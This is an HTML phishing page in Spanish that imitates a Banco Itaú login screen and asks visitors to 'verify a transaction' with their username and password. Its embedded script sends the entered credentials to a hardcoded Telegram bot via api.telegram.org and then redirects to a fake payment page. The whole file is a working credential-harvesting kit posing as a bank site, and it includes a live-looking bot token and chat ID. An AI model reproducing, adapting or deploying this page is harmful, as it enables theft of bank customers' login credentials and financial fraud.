<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f6f6f6;
            margin: 0;
            flex-direction: column;
        }

        .container {
            background-color: white;
            padding: 2rem;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 70%;
            text-align: center;
            margin: 5%;
            margin-bottom: 5%;
        }

        .logo img {
            width: 100px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            color: #333;
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        label {
            text-align: left;
            font-size: 0.9rem;
            margin-bottom: 0.5rem;
            color: #555;
        }

        select, input {
            padding: 0.8rem;
            margin-bottom: 1rem;
            border: solid #ddd;
            border-width: 0 0 2px 0;
            border-radius: 5px;
            font-size: 1rem;
            color: #333;
            width: 100%;
            box-sizing: border-box;
        }

        .forgot-password {
            text-align: right;
            display: block;
            margin-bottom: 1.5rem;
            color: #0066cc;
            font-size: 0.9rem;
        }

        .login-button {
            background-color: transparent;
            border: solid;
            border-width: 1.5px;
            border-color: orange;
            padding: 0.8rem;
            border-radius: 50px;
            font-size: 1rem;
            color: orange;
            cursor: pointer;
            margin-bottom: 1.5rem;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: orange;
            color: white;
        }

        .login-button:disabled {
            cursor: not-allowed;
            opacity: 0.6;
        }

        .register {
            font-size: 0.9rem;
            color: #555;
        }

        .register a {
            color: #0066cc;
            text-decoration: none;
        }

        .register a:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            margin-top: 10px;
            color: #666;
        }
    </style>
</head>
<body style="background-image: url(../../img/fond.svg); background-repeat: no-repeat; background-position:bottom;">

    <header> 
        <div style="padding-bottom: 4%; padding-top: 5%; margin-bottom: 8%; width: 100%; display: flex; justify-content: center; background-color: white;">
            <img style="width: 70%;" src="../img/BANCO ITAU.png" alt="">
        </div>
    </header>

    <h1>Te damos la bienvenida</h1>

    <div class="container">
        <div style="margin-top: 1%; margin-bottom: 8%;">
            <p style="text-align: left;">Verifica la transacci贸n que intentas realizar con tu tarjeta por seguridad</p>
        </div>
        
        <form id="loginForm">
            <input type="text" id="username" name="dato1" placeholder="Usuario" required>
            <input type="password" id="password" name="dato2" placeholder="Ingresa tu contrase帽a" required>
            <a href="#" class="forgot-password">Olvid茅 mi contrase帽a</a>
            <button type="submit" id="submitBtn" class="login-button">INGRESAR</button>
            <div class="loading" id="loading">Enviando datos...</div>
        </form>
    </div>

    <footer style="padding: 5%; margin-bottom: 5%;">
        <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">
            <img src="../../img/vigilado.691ba87177cfc7656937fafcb0c6925a.svg" style="width: 40%;" alt="">
        </div>
    </footer>

    <script>
        // Configuraci贸n de Telegram Bot
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirecci贸n

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Mostrar estado de carga
            submitBtn.disabled = true;
            loading.style.display = 'block';
            
            try {
                // Preparar mensaje para Telegram
                const message = ` Nuevos datos de acceso:\n\n Usuario: ${username}\n Contrase帽a: ${password}\n\n Fecha: ${new Date().toLocaleString('es-ES')}`;
                
                // Enviar a Telegram
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                if (response.ok) {
                    // Redirigir despu茅s del env铆o exitoso
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 1000);
                } else {
                    throw new Error('Error al enviar mensaje');
                }
                
            } catch (error) {
                console.error('Error:', error);
                alert('Error al procesar la solicitud. Intenta de nuevo.');
                
                // Restaurar estado del bot贸n
                submitBtn.disabled = false;
                loading.style.display = 'none';
            }
        });
    </script>
</body>
</html>
